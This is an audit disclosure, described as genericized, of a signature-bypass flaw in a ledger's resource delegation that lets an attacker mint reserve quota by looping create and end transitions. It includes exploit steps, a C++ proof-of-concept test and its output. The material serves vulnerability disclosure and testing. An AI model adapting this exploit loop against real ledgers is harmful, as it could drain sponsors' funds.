# [CRITICAL] Asymmetric Signature Validation (Infinite Reserve Minting)

> **Disclosure:** Educational abstraction. Vendor details are genericized. Core state-machine flaw remains 1:1.

| Field      | Value                          |
|------------|--------------------------------|
| **Author** | Ayoub Aragui (aragui99)        |
| **Category** | State Deviation              |
| **Language** | C/C++                        |

---

## Context & Invariant

In this DLT state machine, resource delegation requires strict symmetry.

**Invariant:** A locked native reserve quota can only be refunded to a sponsor
during termination if it was actually deducted during creation.

---

## The Flaw

There is a structural asymmetry in `ResourceDelegation.cpp`.

During creation (`FLAG_DELEGATE_CREATE`), if a valid signature bypass is
triggered, the quota deduction is skipped (the `-delta` subtraction never
happens). However, during termination (`FLAG_DELEGATE_END`), the protocol blindly
refunds the quota (`+delta`) without checking the initial funding state.

> Bypass creation skips `-delta`. Blind termination applies `+delta`
> unconditionally.

---

## The Exploit

An attacker exploits this gap by looping asymmetric transitions:

1. Submit a generic ledger object.
2. Submit `DelegateCreate` with the signature bypass (quota remains unchanged).
3. Submit `DelegateEnd`. The protocol blindly refunds 1 quota.

**Impact:** The attacker mints "ghost quotas" out of thin air
(`Quota_final = Quota_initial + 1`). By looping this zero-constraint execution,
they drain the native reserve cost directly from the Sponsor's balance, leading
to a 100% loss of funds.

---

## PoC (State Deviation)

> Uses `shared/cpp/audit_log.h` and `shared/cpp/test_harness.h` for
> standardized logging and test lifecycle.

```cpp
#include <dlt_core/testing/env.h>
#include "shared/cpp/audit_log.h"
#include "shared/cpp/test_harness.h"

using namespace dlt::test;

class del_aragui99_test : public audit::test_harness {
public:
    del_aragui99_test() : test_harness("Asymmetric State Minting") {}

protected:
    void execute() override {
        test_env env;
        account spn("sponsor"), atk("attacker");
        env.fund(10000, spn, atk);

        // setup initial delegation
        env(json{{"TransactionType", "DelegationSet"},
                 {"Account", spn.human()},
                 {"Delegatee", atk.human()},
                 {"ReserveCount", 1}});
        AUDIT_INFO("Init Quota",
                   env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount));

        auto target = keylet::line(atk, spn);

        // trigger bypass on creation
        env(json{{"TransactionType", "DelegationTransfer"},
                 {"Account", atk.human()},
                 {"ObjectID", strHex(target)},
                 {"Flags", FLAG_DELEGATE_CREATE}},
            with_signature(spn));
        AUDIT_INFO("Quota after bypass",
                   env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount));

        // trigger blind refund
        env(json{{"TransactionType", "DelegationTransfer"},
                 {"Account", atk.human()},
                 {"ObjectID", strHex(target)},
                 {"Flags", FLAG_DELEGATE_END}});

        auto final_q = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
        AUDIT_CRITICAL("Final Quota (MINTED)", final_q);

        AUDIT_ASSERT_EQ(final_q, 2u, "quota minted from thin air");
    }
};

int main() {
    return del_aragui99_test().run();
}
```

---

## Output

```
=== aragui99 PoC: Asymmetric State Minting ===

[*] aragui99 - Init Quota: 1
[*] aragui99 - Quota after bypass: 1
[!] aragui99 - Final Quota (MINTED): 2
[PASS] aragui99 - quota minted from thin air

=== Completed in <N> ms ===
```
